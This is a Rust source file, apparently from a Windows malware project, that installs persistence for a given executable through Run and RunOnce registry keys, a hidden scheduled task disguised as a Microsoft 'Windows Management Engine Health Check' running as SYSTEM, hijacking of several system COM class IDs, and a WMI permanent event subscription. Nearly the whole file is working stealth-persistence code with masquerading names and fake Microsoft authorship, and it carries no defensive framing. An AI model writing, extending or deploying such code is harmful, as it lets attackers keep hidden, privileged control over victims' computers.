use crate::recovery::helpers::com::{Variant, SysAllocString, SysFreeString, CoSetProxyBlanket};
use crate::recovery::helpers::com_defs::*;
use log::{debug, warn};
use std::path::Path;
use std::ptr;
use windows_sys::Win32::Foundation::S_OK;
use windows_sys::Win32::System::Com::*;
use windows_sys::Win32::System::Registry::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use windows_sys::core::GUID;
use windows_sys::Win32::System::Variant::VT_BSTR;
use winreg::RegKey;

// Helper for BSTR management
struct BStr(BSTR);

impl BStr {
    fn new(s: &str) -> Option<Self> {
        let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
        unsafe {
            let ptr = SysAllocString(wide.as_ptr());
            if ptr.is_null() {
                None
            } else {
                Some(BStr(ptr))
            }
        }
    }

    fn as_ptr(&self) -> BSTR {
        self.0
    }
}

impl Drop for BStr {
    fn drop(&mut self) {
        unsafe {
            SysFreeString(self.0);
        }
    }
}

// Wrapper for CoInitialize/CoUninitialize
struct ComGuard;

impl ComGuard {
    fn new(flags: COINIT) -> Self {
        unsafe {
            CoInitializeEx(ptr::null(), flags as u32);
        }
        ComGuard
    }
}

impl Drop for ComGuard {
    fn drop(&mut self) {
        unsafe {
            CoUninitialize();
        }
    }
}

unsafe fn create_instance<T>(
    clsid: *const GUID,
    outer: *mut IUnknown,
    context: CLSCTX,
    iid: *const GUID,
) -> Result<*mut T, i32> {
    let mut instance = ptr::null_mut();
    let hr = unsafe { CoCreateInstance(clsid, outer as *mut _, context, iid, &mut instance) };
    if hr == S_OK {
        Ok(instance as *mut T)
    } else {
        Err(hr)
    }
}

pub fn is_admin() -> bool {
    #[cfg(feature = "uac")]
    {
        crate::recovery::uac::is_admin()
    }
    #[cfg(not(feature = "uac"))]
    {
        use std::process::Command;
        let output = Command::new("net").arg("session").output();
        match output {
            Ok(out) => out.status.success(),
            Err(_) => false,
        }
    }
}

pub fn install_persistence(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    debug!("Installing persistence for: {}", path.display());

    // 1. Scheduled Task via COM
    let _ = ensure_scheduled_task(path);

    // 2. Registry Run Keys (Standard)
    let _ = ensure_run_keys(path);

    // 3. COM Hijacking
    let _ = ensure_com_hijack_refined(path);

    // 4. WMI Event Subscription (Admin only)
    let _ = ensure_wmi_event_consumer(path);

    Ok(())
}

pub fn is_running_from_persistence() -> bool {
    // Basic check for now, can be expanded
    false
}

fn ensure_run_keys(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER as _);
    let path_str = path.to_string_lossy();

    // HKCU Run
    if let Ok((key, _)) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run") {
        let _ = key.set_value("WinMgmtEngine", &path_str.as_ref());
    }

    // HKCU RunOnce
    if let Ok((key, _)) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\RunOnce") {
        let _ = key.set_value("WinMgmtEngineUpdate", &path_str.as_ref());
    }

    if is_admin() {
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE as _);
        // HKLM Run
        if let Ok((key, _)) = hklm.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run") {
            let _ = key.set_value("WinMgmtEngine", &path_str.as_ref());
        }
    }

    Ok(())
}

fn ensure_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let _guard = ComGuard::new(COINIT_MULTITHREADED);

        let service: *mut ITaskService = create_instance(
            &CLSID_TASKSCHEDULER,
            ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            &IID_ITASKSERVICE,
        )
        .map_err(|e| format!("Failed to create TaskService: {:x}", e))?;

        let empty_var = Variant::new(); // VT_EMPTY
        let hr = ((*(*service).lp_vtbl).connect)(
            service,
            empty_var.0,
            empty_var.0,
            empty_var.0,
            empty_var.0,
        );
        if hr != S_OK {
            ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
            return Err(format!("ITaskService::Connect failed: {:x}", hr).into());
        }

        let root_folder_name = BStr::new("\\").ok_or("Failed to alloc BSTR")?;
        let mut folder: *mut ITaskFolder = ptr::null_mut();
        let hr = ((*(*service).lp_vtbl).get_folder)(service, root_folder_name.as_ptr(), &mut folder);
        if hr != S_OK {
            ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
            return Err(format!("ITaskService::GetFolder failed: {:x}", hr).into());
        }

        let mut task_definition: *mut ITaskDefinition = ptr::null_mut();
        let hr = ((*(*service).lp_vtbl).new_task)(service, 0, &mut task_definition);
        if hr != S_OK {
            ((*(*folder).lp_vtbl).parent.parent.release)(folder as *mut _);
            ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
            return Err(format!("ITaskService::NewTask failed: {:x}", hr).into());
        }

        let mut reg_info: *mut IRegistrationInfo = ptr::null_mut();
        let hr = ((*(*task_definition).lp_vtbl).get_registration_info)(task_definition, &mut reg_info);
        if hr == S_OK {
            let desc = BStr::new("Windows Management Engine Health Check").ok_or("BSTR failed")?;
            ((*(*reg_info).lp_vtbl).put_description)(reg_info, desc.as_ptr());
            let author = BStr::new("Microsoft Corporation").ok_or("BSTR failed")?;
            ((*(*reg_info).lp_vtbl).put_author)(reg_info, author.as_ptr());
            ((*(*reg_info).lp_vtbl).parent.parent.release)(reg_info as *mut _);
        }

        let mut settings: *mut ITaskSettings = ptr::null_mut();
        let hr = ((*(*task_definition).lp_vtbl).get_settings)(task_definition, &mut settings);
        if hr == S_OK {
            ((*(*settings).lp_vtbl).put_enabled)(settings, -1); // VARIANT_TRUE is -1
            ((*(*settings).lp_vtbl).put_hidden)(settings, -1);
            ((*(*settings).lp_vtbl).put_allow_demand_start)(settings, -1);
            ((*(*settings).lp_vtbl).put_start_when_available)(settings, -1);
            ((*(*settings).lp_vtbl).put_compatibility)(settings, TASK_COMPATIBILITY_V2);
            ((*(*settings).lp_vtbl).parent.parent.release)(settings as *mut _);
        }

        let mut triggers: *mut ITriggerCollection = ptr::null_mut();
        let hr = ((*(*task_definition).lp_vtbl).get_triggers)(task_definition, &mut triggers);
        if hr == S_OK {
            let mut trigger: *mut ITrigger = ptr::null_mut();
            let hr = ((*(*triggers).lp_vtbl).create)(triggers, TASK_TRIGGER_LOGON, &mut trigger);
            if hr == S_OK {
                let mut logon_trigger: *mut ILogonTrigger = ptr::null_mut();
                // QueryInterface for ILogonTrigger
                let hr = ((*(*trigger).lp_vtbl).parent.parent.query_interface)(
                    trigger as *mut _,
                    &IID_ILOGONTRIGGER,
                    &mut logon_trigger as *mut _ as *mut _,
                );
                if hr == S_OK {
                    ((*(*logon_trigger).lp_vtbl).parent.put_enabled)(logon_trigger as *mut _, -1);
                    ((*(*logon_trigger).lp_vtbl).parent.parent.parent.release)(
                        logon_trigger as *mut _,
                    );
                }
                ((*(*trigger).lp_vtbl).parent.parent.release)(trigger as *mut _);
            }
            ((*(*triggers).lp_vtbl).parent.parent.release)(triggers as *mut _);
        }

        let mut actions: *mut IActionCollection = ptr::null_mut();
        let hr = ((*(*task_definition).lp_vtbl).get_actions)(task_definition, &mut actions);
        if hr == S_OK {
            let mut action: *mut IAction = ptr::null_mut();
            let hr = ((*(*actions).lp_vtbl).create)(actions, TASK_ACTION_EXEC, &mut action);
            if hr == S_OK {
                let mut exec_action: *mut IExecAction = ptr::null_mut();
                let hr = ((*(*action).lp_vtbl).parent.parent.query_interface)(
                    action as *mut _,
                    &IID_IEXECACTION,
                    &mut exec_action as *mut _ as *mut _,
                );
                if hr == S_OK {
                    let path_bstr = BStr::new(&path.to_string_lossy()).ok_or("BSTR failed")?;
                    ((*(*exec_action).lp_vtbl).put_path)(exec_action, path_bstr.as_ptr());
                    ((*(*exec_action).lp_vtbl).parent.parent.parent.release)(exec_action as *mut _);
                }
                ((*(*action).lp_vtbl).parent.parent.release)(action as *mut _);
            }
            ((*(*actions).lp_vtbl).parent.parent.release)(actions as *mut _);
        }

        let mut principal: *mut IPrincipal = ptr::null_mut();
        let hr = ((*(*task_definition).lp_vtbl).get_principal)(task_definition, &mut principal);
        if hr == S_OK {
            if is_admin() {
                ((*(*principal).lp_vtbl).put_run_level)(principal, TASK_RUNLEVEL_HIGHEST);
                ((*(*principal).lp_vtbl).put_logon_type)(principal, TASK_LOGON_SERVICE_ACCOUNT);
                let user_id = BStr::new("NT AUTHORITY\\SYSTEM").ok_or("BSTR failed")?;
                ((*(*principal).lp_vtbl).put_user_id)(principal, user_id.as_ptr());
            } else {
                ((*(*principal).lp_vtbl).put_run_level)(principal, TASK_RUNLEVEL_LUA);
                ((*(*principal).lp_vtbl).put_logon_type)(principal, TASK_LOGON_INTERACTIVE_TOKEN);
            }
            ((*(*principal).lp_vtbl).parent.parent.release)(principal as *mut _);
        }

        let task_name = BStr::new("WinMgmtEngineHealth").ok_or("BSTR failed")?;
        let mut registered_task: *mut IRegisteredTask = ptr::null_mut();
        let empty_var = Variant::new();
        let hr = ((*(*folder).lp_vtbl).register_task_definition)(
            folder,
            task_name.as_ptr(),
            task_definition,
            TASK_CREATE_OR_UPDATE as i32,
            empty_var.0,
            empty_var.0,
            TASK_LOGON_NONE,
            empty_var.0,
            &mut registered_task,
        );

        if hr == S_OK {
            debug!("scheduled task persistence installed via COM API");
            ((*(*registered_task).lp_vtbl).parent.parent.release)(registered_task as *mut _);
        } else {
            warn!("RegisterTaskDefinition failed: {:x}", hr);
        }

        ((*(*task_definition).lp_vtbl).parent.parent.release)(task_definition as *mut _);
        ((*(*folder).lp_vtbl).parent.parent.release)(folder as *mut _);
        ((*(*service).lp_vtbl).parent.parent.release)(service as *mut _);
    }
    Ok(())
}

fn ensure_com_hijack_refined(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let clsids = [
        "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruLongList
        "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MmcDmp
        "{FBEB8A05-BEEE-4442-8594-1592C541D06F}", // Speech Recognition
        "{00021401-0000-0000-C000-000000000046}", // Shortcut
        "{63354731-1688-4E7B-8228-05F7CE2A1145}", // Remote Assistance
    ];

    let hkcu = RegKey::predef(HKEY_CURRENT_USER as _);
    let path_str = path.to_string_lossy();

    for clsid in clsids {
        let base_path = format!(r"Software\Classes\CLSID\{}", clsid);

        if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\LocalServer32", base_path)) {
            let _ = key.set_value("", &path_str.as_ref());
        }

        if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\InprocServer32", base_path)) {
            let _ = key.set_value("", &path_str.as_ref());
            let _ = key.set_value("ThreadingModel", &"Both");
        }
    }
    Ok(())
}

fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    if !is_admin() {
        return Ok(());
    }

    unsafe {
        let _guard = ComGuard::new(COINIT_MULTITHREADED);

        let locator: *mut IWbemLocator = create_instance(
            &CLSID_WBEMLOCATOR,
            ptr::null_mut(),
            CLSCTX_INPROC_SERVER,
            &IID_IWBEMLOCATOR,
        )
        .map_err(|e| format!("Failed to create WbemLocator: {:x}", e))?;

        let namespace = BStr::new("root\\subscription").ok_or("BSTR failed")?;
        let mut services: *mut IWbemServices = ptr::null_mut();
        let hr = ((*(*locator).lp_vtbl).connect_server)(
            locator,
            namespace.as_ptr(),
            ptr::null_mut(), // User
            ptr::null_mut(), // Password
            ptr::null_mut(), // Locale
            0,               // Flags
            ptr::null_mut(), // Authority
            ptr::null_mut(), // Context
            &mut services,
        );

        if hr != S_OK {
            ((*(*locator).lp_vtbl).parent.release)(locator as *mut _);
            return Err(format!("IWbemLocator::ConnectServer failed: {:x}", hr).into());
        }

        // Set proxy blanket
        CoSetProxyBlanket(
            services as *mut _,
            10, // RPC_C_AUTHN_WINNT
            0,  // RPC_C_AUTHZ_NONE
            ptr::null(),
            RPC_C_AUTHN_LEVEL_CALL,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            EOAC_NONE as u32,
        );

        let put_prop = |inst: *mut IWbemClassObject,
                        name: &str,
                        value: &str|
         -> Result<(), Box<dyn std::error::Error>> {
            let mut v = Variant::new();
            let bstr_val = BStr::new(value).ok_or("BSTR failed")?;
            v.0.Anonymous.Anonymous.vt = VT_BSTR;
            v.0.Anonymous.Anonymous.Anonymous.bstrVal = bstr_val.as_ptr();
            std::mem::forget(bstr_val);

            let name_bstr = BStr::new(name).ok_or("BSTR failed")?;
            let hr = ((*(*inst).lp_vtbl).put)(inst, name_bstr.as_ptr(), 0, &v.0, 0);
            if hr != S_OK {
                return Err(format!("IWbemClassObject::Put failed: {:x}", hr).into());
            }
            Ok(())
        };

        let task_name = "WinMgmtEngineHealth";
        let exe_path = path.to_string_lossy();

        let mut filter_class: *mut IWbemClassObject = ptr::null_mut();
        let filter_class_name = BStr::new("__EventFilter").ok_or("BSTR failed")?;
        // GetObject is 4th method of IWbemServices? No, offset 6 (0-2 IUnknown, 3, 4, 5, 6).
        let hr = ((*(*services).lp_vtbl).get_object)(
            services,
            filter_class_name.as_ptr(),
            0,
            ptr::null_mut(),
            &mut filter_class,
            ptr::null_mut(),
        );
        if hr == S_OK {
            let mut filter_inst: *mut IWbemClassObject = ptr::null_mut();
            let hr = ((*(*filter_class).lp_vtbl).spawn_instance)(filter_class, 0, &mut filter_inst);
            if hr == S_OK {
                put_prop(filter_inst, "Name", task_name)?;
                put_prop(filter_inst, "QueryLanguage", "WQL")?;
                put_prop(
                    filter_inst,
                    "Query",
                    "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'",
                )?;
                put_prop(filter_inst, "EventNamespace", "root\\cimv2")?;

                ((*(*services).lp_vtbl).put_instance)(
                    services,
                    filter_inst,
                    crate::recovery::helpers::com_defs::WBEM_FLAG_CREATE_OR_UPDATE,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                ((*(*filter_inst).lp_vtbl).parent.release)(filter_inst as *mut _);
            }
            ((*(*filter_class).lp_vtbl).parent.release)(filter_class as *mut _);
        }

        let mut consumer_class: *mut IWbemClassObject = ptr::null_mut();
        let consumer_class_name = BStr::new("CommandLineEventConsumer").ok_or("BSTR failed")?;
        let hr = ((*(*services).lp_vtbl).get_object)(
            services,
            consumer_class_name.as_ptr(),
            0,
            ptr::null_mut(),
            &mut consumer_class,
            ptr::null_mut(),
        );
        if hr == S_OK {
            let mut consumer_inst: *mut IWbemClassObject = ptr::null_mut();
            let hr = ((*(*consumer_class).lp_vtbl).spawn_instance)(consumer_class, 0, &mut consumer_inst);
            if hr == S_OK {
                put_prop(consumer_inst, "Name", task_name)?;
                put_prop(consumer_inst, "CommandLineTemplate", &exe_path)?;

                ((*(*services).lp_vtbl).put_instance)(
                    services,
                    consumer_inst,
                    crate::recovery::helpers::com_defs::WBEM_FLAG_CREATE_OR_UPDATE,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                ((*(*consumer_inst).lp_vtbl).parent.release)(consumer_inst as *mut _);
            }
            ((*(*consumer_class).lp_vtbl).parent.release)(consumer_class as *mut _);
        }

        let mut binding_class: *mut IWbemClassObject = ptr::null_mut();
        let binding_class_name = BStr::new("__FilterToConsumerBinding").ok_or("BSTR failed")?;
        let hr = ((*(*services).lp_vtbl).get_object)(
            services,
            binding_class_name.as_ptr(),
            0,
            ptr::null_mut(),
            &mut binding_class,
            ptr::null_mut(),
        );
        if hr == S_OK {
            let mut binding_inst: *mut IWbemClassObject = ptr::null_mut();
            let hr = ((*(*binding_class).lp_vtbl).spawn_instance)(binding_class, 0, &mut binding_inst);
            if hr == S_OK {
                let filter_path = format!("__EventFilter.Name=\"{}\"", task_name);
                let consumer_path = format!("CommandLineEventConsumer.Name=\"{}\"", task_name);

                put_prop(binding_inst, "Filter", &filter_path)?;
                put_prop(binding_inst, "Consumer", &consumer_path)?;

                ((*(*services).lp_vtbl).put_instance)(
                    services,
                    binding_inst,
                    crate::recovery::helpers::com_defs::WBEM_FLAG_CREATE_OR_UPDATE,
                    ptr::null_mut(),
                    ptr::null_mut(),
                );
                ((*(*binding_inst).lp_vtbl).parent.release)(binding_inst as *mut _);
            }
            ((*(*binding_class).lp_vtbl).parent.release)(binding_class as *mut _);
        }

        debug!("WMI permanent event subscription installed successfully");
        ((*(*services).lp_vtbl).parent.release)(services as *mut _);
        ((*(*locator).lp_vtbl).parent.release)(locator as *mut _);
    }

    Ok(())
}

